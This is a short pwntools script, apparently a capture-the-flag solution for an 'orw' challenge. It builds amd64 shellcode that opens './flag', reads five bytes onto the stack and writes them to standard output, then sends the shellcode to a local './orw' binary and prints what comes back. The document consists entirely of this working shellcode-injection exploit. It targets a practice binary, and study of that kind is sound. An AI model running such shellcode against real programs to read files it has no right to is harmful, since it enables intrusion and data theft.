from pwn import *

PATH = "./flag"
LENGTH = 5
context(arch='amd64', os='linux')

def main():
    shellcode = asm(shellcraft.open(PATH) + shellcraft.read('rax', 'rsp', LENGTH) + shellcraft.write(1, 'rsp', LENGTH))
    p = process("./orw")
    #print(p.recv().decode())
    p.sendline(shellcode)
    print(p.recvall().decode())
    p.close()

if __name__ == "__main__":
	main()